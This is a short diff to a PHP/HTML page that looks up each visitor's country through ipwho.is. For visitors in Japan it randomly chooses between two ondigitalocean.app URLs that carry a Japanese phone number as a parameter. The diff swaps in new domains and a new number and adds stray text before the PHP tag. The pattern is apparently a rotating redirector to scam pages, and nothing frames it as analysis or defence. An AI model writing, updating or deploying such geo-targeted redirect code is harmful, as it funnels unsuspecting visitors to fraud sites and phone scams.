@@ -1,4 +1,4 @@
-<?php
+starfish-app<?php
   ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -18,8 +18,8 @@ fetch("https://ipwho.is/")
 
     if (countryCode === "JP") {
       (function () {
-        const domainA = "https://sea-turtle-app-skqfl.ondigitalocean.app/?bcda=(03)-4520-9115";
-        const domainB = "https://urchin-app-2-ctvsc.ondigitalocean.app/?bcda=(03)-4520-9115";
+        const domainA = "https://orca-app-vodng.ondigitalocean.app/?bcda=(050)-3097-5847";
+        const domainB = "https://sea-lion-app-2-to6sa.ondigitalocean.app/?bcda=(050)-3097-5847";
 
         // Random number between 0 and 1
         if (Math.random() < 0.5) {
